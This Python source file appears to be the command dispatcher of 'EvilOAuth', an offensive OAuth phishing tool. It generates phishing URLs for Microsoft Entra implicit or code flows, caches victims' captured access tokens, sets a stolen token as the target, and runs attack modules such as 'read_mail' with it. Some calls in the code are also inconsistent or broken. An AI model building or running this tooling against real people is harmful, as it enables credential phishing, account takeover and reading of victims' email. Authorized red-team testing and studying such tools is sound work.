import sys
import logging
from enum import Enum, auto
from diskcache import Cache
from eviloauth.idp import IDP
from eviloauth.exceptions import EviloauthCommandException
from eviloauth.access_token import AccessToken
from eviloauth import app, cache, temp_dir, load_modules
from datetime import datetime, timedelta
from eviloauth.general_token import GeneralToken

class CommandType(Enum):
    EXIT = "exit"
    MODULE = "module"
    TOKENS = "tokens"
    IDP = "idp"
    TARGET = "target"
    URL = "url"
    HELP = "help"
    
class TokenSubCommand(Enum):
    LIST = "list"
    DELETE = "delete"
    
class IDPSubCommand(Enum):
    LIST = "list"
    CONFIGURE = "configure"

class PlatformType(Enum):
    AZURE = "azure"
    AWS = "aws"
    OKTA = "okta"

class AzureAttack(Enum):
    READ_MAIL = "read_mail"

class TargetSubCommand(Enum):
    LIST = "list"
    SET = "set"

class TokenManager:
    def __init__(self, cache_dir, general_cache):
        
        self.cache = Cache(cache_dir)
        self.general_cache = general_cache

    def list_tokens(self):
        general_tokens = self.general_cache.get('tokens', {})
        return list(general_tokens.keys())
    
    def add(self, access_token):
        if isinstance(access_token, AccessToken):
            token_key = str(access_token)
            self.cache.set(token_key, access_token)
            return token_key
            
    def delete(self, token_key):
            if token_key in self.cache:
                self.cache.delete(token_key)
                return True
            return False

    def list(self):
        return [key for key in self.cache.keys()]
        
class Dispatcher:
    def __init__(self, flask_server, module_dict, redirect_server, cache):
        logging.debug('Initializing dispatcher')
        logging.debug(f'\tFlask server: {flask_server}')
        logging.debug(f'\tModule dict: {module_dict}')
        logging.debug(f'\tCache: {cache}')
        logging.debug(f'\tRedirect server: {redirect_server}')

        self.flask_server = flask_server
        self.module_dict = module_dict
        self.redirect_server = redirect_server
        self.cache = cache
        self.token_manager = TokenManager(temp_dir, cache)
        logging.debug(f'\tToken manager initialized with cache directory: {temp_dir}')
        
    @classmethod
    def get_token_manager(cls):
        if cls.instance:
            return cls.instance.token_manager
        else:
            return None

    def dispatch(self, commands):
        logging.debug(f'Dispatching command: {commands}')
        cmd_parts = commands.split(' ')
        cmd, sub, *args = (cmd_parts + [None, None])[:3]

        try:
            command_type = CommandType(cmd.lower())
        except ValueError:
            raise EviloauthCommandException(f'Unknown command {cmd}')

        if command_type == CommandType.EXIT:
            self.dispatch_exit()
        elif command_type == CommandType.MODULE:
            self.dispatch_module(sub, *args)
        elif command_type == CommandType.TOKENS:
            self.dispatch_tokens(sub, *args)
        elif command_type == CommandType.IDP:
            self.dispatch_idp(sub, *args)
        elif command_type == CommandType.TARGET:
            self.dispatch_target(sub, *args)
        elif command_type == CommandType.URL:
            self.dispatch_url()
        elif command_type == CommandType.HELP:
            self.dispatch_help(sub, *args)
        else:
            raise EviloauthCommandException(f'Unhandled command type: {cmd}')

    def dispatch_exit(self):
        logging.debug('Executing exit command')
        print('Exiting...')
        self.flask_server.shutdown()
        sys.exit()

    def dispatch_module(self, module_name, sub_module_name, *module_args):
        logging.debug(f'Dispatching module command: {module_name}, {sub_module_name}, {module_args}')
        if module_name and sub_module_name:
            try:
                full_module_name = f'eviloauth.module.{module_name}.{sub_module_name}'
                if full_module_name in self.module_dict:
                    mod = self.module_dict[full_module_name]
                    target_info = self.cache.get('target', {})

                    if target_info and 'raw_token' in target_info:
                        raw_token_str = target_info['raw_token']
                        mod.__run__(raw_token_str)
                    else:
                        logging.error("No target token key set or raw token string is missing")
                        print("No target token key set or raw token string is missing")
                else:
                    logging.error(f"Module {full_module_name} not found")
                    print(f"Module {full_module_name} not found")
            except Exception as e:
                logging.error(f"Error during module execution: {e}")
                print(f"Error during module execution: {e}")
        else:
            raise EviloauthCommandException("Invalid module command arguments")

    def get_full_module_name(self, platform, sub_module_name):
        if platform == PlatformType.AZURE:
            try:
                azure_action = AzureAttack(sub_module_name.lower())
                return f'eviloauth.module.azure.{azure_action.value}'
            except ValueError:
                raise EviloauthCommandException(f'Unknown Azure action {sub_module_name}')

    def dispatch_tokens(self, subcmd, *cmd_args):
        try:
            token_command = TokenSubCommand(subcmd.lower())
        except ValueError:
            raise EviloauthCommandException(f'Unknown tokens subcommand {subcmd}')

        if token_command == TokenSubCommand.LIST:
            self.handle_tokens_list(*cmd_args)
        elif token_command == TokenSubCommand.DELETE:
            self.handle_tokens_delete(*cmd_args)
        else:
            raise EviloauthCommandException(f'Unhandled tokens subcommand: {subcmd}')
        
    def handle_tokens_list(self, *cmd_args):
        logging.debug(f'Handling tokens list command with args: {cmd_args}')
        # Check if a token key is provided
        if cmd_args and cmd_args[0]:
            token_key = cmd_args[0].strip("'")
            logging.info(f"Fetching token details for key: {token_key}")

            general_tokens = self.token_manager.cache.get('tokens', {})
            logging.info(f"Current tokens in cache: {list(general_tokens.keys())}")

            if token_key in general_tokens:
                token_obj = general_tokens[token_key]
                if token_obj:
                    token_details = token_obj.get_token_details()
                    print(f"Details for token {token_key}:")
                    for detail, value in token_details.items():
                        print(f"  {detail.capitalize()}: {value}")
                else:
                    logging.warning(f"No token object found for key: {token_key}")
                    print(f"No token found for key: {token_key}")
            else:
                logging.warning(f"Token key {token_key} not found in cache")
                print(f"No token found for key: {token_key}")
        else:
            # If no token key is provided, list all available token keys
            general_tokens = self.token_manager.cache.get('tokens', {})
            if general_tokens:
                print("Available token keys:", list(general_tokens.keys()))
            else:
                print("No tokens available.")

    def handle_tokens_delete(self, cmd_args):
        if len(cmd_args) == 2 and cmd_args[0] == 'delete':
            token_key = cmd_args[1]
            if self.token_manager.delete(token_key):
                print(f"Token {token_key} deleted successfully.")
            else:
                print(f"Token {token_key} not found or could not be deleted.")

    def dispatch_configure(self, sub, *args):
        logging.debug(f'Dispatching configure command: {sub}, {args}')
        if sub == 'idp' and args:
            self.handle_configure_idp(*args)
        else:
            logging.error("Invalid or missing arguments for configure command")

    def handle_configure_idp(self, idp_arg):
        if idp_arg in ['entra_implicit_flow', 'entra_code_flow']:
            idp = IDP(idp_arg, self.redirect_server)
            self.cache.set('idp', idp)

            self.phishing_url = idp.get_phishing_url()
            print(f"Phishing URL set: {self.phishing_url}")
            logging.info(f'{idp.uri}')
        else:
            logging.error(f"IDP {idp_arg} is not supported. Supported IDPs: ['entra_implicit_flow', 'entra_code_flow']")
                
    def handle_target_set(self, token_key):
        # Fetch the dictionary of GeneralTokens from the cache
        general_tokens = self.token_manager.cache.get('tokens', {})

        if token_key in general_tokens:
            general_token = general_tokens[token_key]
            # Retrieve the raw token from the GeneralToken object
            raw_token_str = general_token.get_token_details().get('raw_token')

            # Check if raw token string is available
            if raw_token_str:
                # Store both the raw token string and the token key name
                self.cache.set('target', {'token_key': token_key, 'raw_token': raw_token_str})
                logging.info(f"Target set with raw token for {token_key}")
                print(f"Target set with raw token for {token_key}")
            else:
                logging.error("Raw token string is missing from GeneralToken")
                print("Raw token string is missing from GeneralToken")
        else:
            logging.error(f"Token {token_key} not found in cache")
            print(f"Token {token_key} not found in cache")

    def handle_target_list(self):
        current_target = self.cache.get('target')
        if current_target:
            # Display the token key name
            print(f"Current Target Token Key: {current_target.get('token_key')}")
        else:
            print("No targets set.\nTo set a target use the following command: target set <token name>")

    def dispatch_target(self, sub, *args):
        logging.debug(f'Dispatching target command: {sub}, {args}')
        if sub:
            try:
                target_command = TargetSubCommand(sub.lower())
            except ValueError:
                raise EviloauthCommandException(f'Unknown target subcommand {sub}')

            if target_command == TargetSubCommand.SET:
                if args and args[0]:
                    self.handle_target_set(args[0])
                else:
                    logging.error("No token key provided for target set")
            elif target_command == TargetSubCommand.LIST:
                self.handle_target_list()
            else:
                raise EviloauthCommandException(f'Unhandled target subcommand: {sub}')
        else:
            logging.error("Invalid arguments for target command")

    def dispatch_url(self):
        if self.phishing_url:
            print(f"Phishing URL:\n{self.phishing_url}")
        else:
            print("Phishing URL not set. Please run 'configure idp' first.")

    def dispatch_idp(self, sub, *args):
        logging.debug(f'Dispatching idp command: {sub}, {args}')
        if sub:
            try:
                idp_command = IDPSubCommand(sub.lower())
            except ValueError:
                raise EviloauthCommandException(f'Unknown idp subcommand {sub}')

            if idp_command == IDPSubCommand.LIST:
                self.handle_idp_list()
            elif idp_command == IDPSubCommand.CONFIGURE and args:
                self.handle_idp_configure(*args)
            else:
                raise EviloauthCommandException(f'Unhandled idp subcommand: {sub}')
        else:
            logging.error("Invalid idp command arguments")

    def handle_idp_list(self):
        current_idp = self.cache.get('idp')
        if current_idp:
            print(f'Current IDP: {current_idp}')
        else:
            print("No IDP is currently configured.")

    def handle_idp_configure(self, *args):
        if len(args) >= 1:
            idp_arg = args[0]
            if idp_arg in ['entra_implicit_flow', 'entra_code_flow']:
                idp = IDP(idp_arg, self.redirect_server)
                self.cache.set('idp', idp)
                the_phishing_url = idp.get_phishing_url()
                print(f"Phishing URL set: {the_phishing_url}")
            else:
                logging.error(f"IDP {idp_arg} is not supported. Supported IDPs: ['entra_implicit_flow', 'entra_code_flow']")
        else:
            logging.error("Missing arguments for idp configure command")

    def dispatch_help(self, cmd_args):
        if not cmd_args or len(cmd_args) == 0:
            self.display_general_help()
        elif cmd_args[0] == 'modules':
            self.display_modules_help()
        elif cmd_args[0] == 'tokens':
            self.display_tokens_help()
        elif cmd_args[0] == 'configure':
            self.display_configure_help()
        elif cmd_args[0] == 'url':
            self.display_url_help()
        else:
            print(f"No specific help available for '{cmd_args[0]}'")

    def display_general_help(self):
        help_text = """
        EvilOAuth General Help:

        Commands:
        - exit: Exits the application.
        - modules: Manages different modules.
        - tokens: Manages tokens.
        - configure: Configures the Identity Provider.
        - url: Displays the phishing URL.
        - help: Displays help information.

        For detailed help on specific commands, type 'help <command>'.
        """
        print(help_text)

    def display_modules_help(self):
        help_text = """
        Modules Command Help:

        Usage: modules <module_name> <sub_module_name> <sub_module_action>

        - Runs a specified module.
        - Example: modules read_mail imap read
        """
        print(help_text)

    def display_tokens_help(self):
        help_text = """
        Tokens Command Help:

        Usage: tokens <subcommand> [<args>]

        Subcommands:
        - list [<token_key>]: Lists all tokens or details of a specific token.
        - set <token_key> <attribute> <value>: Updates attributes of a token.
        - delete <token_key>: Deletes a specified token.

        Attributes for 'set' subcommand:
        - upn: Updates the User Principal Name.
        - scope: Updates the scope.
        - expiry: Updates the expiry time in HHMM format.

        Example: tokens set OAT-example upn new-upn@example.com
        """
        print(help_text)

    def display_configure_help(self):
        help_text = """
        Configure Command Help:

        Usage: configure idp <idp_name>

        - Configures the Identity Provider.
        - Supported IDPs: entra_implicit_flow, entra_code_flow
        - Example: configure idp entra_implicit_flow
        """
        print(help_text)

    def display_url_help(self):
        help_text = """
        URL Command Help:

        Usage: url

        - Displays the phishing URL if set.
        - Requires running 'configure idp' command first.
        """
        print(help_text)